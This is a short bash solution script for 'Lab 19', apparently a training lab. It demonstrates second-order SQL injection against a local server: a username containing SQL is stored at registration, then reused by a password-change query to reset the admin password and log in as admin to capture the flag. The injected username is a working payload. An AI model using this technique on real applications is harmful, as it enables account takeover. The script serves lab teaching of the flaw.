#!/usr/bin/env bash
# Lab 19 — store the payload through the safe endpoint; detonate it in the
# one that trusts what storage handed back.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9190}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab19

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

post() {  # post PATH JSON-SET-ARGS...
    local path="$1"; shift
    send "$SESSION" req_0 --create --set method=POST --set "path=$path" \
        --set header.Content-Type=application/json "$@"
}

# 1. A username that is SQL. `register` binds it, so it lands verbatim.
post /api/register --set "json.username=zz' OR username='admin" --set json.password=pw1 >/dev/null

# 2. Change "my" password. The UPDATE pastes the stored username into its
#    WHERE clause, so it matches admin too.
post /api/password --set "json.username=zz' OR username='admin" \
    --set json.password=pw1 --set json.new=owned >/dev/null

# 3. admin's password is now `owned`.
post /api/login --set json.username=admin --set json.password=owned | flag
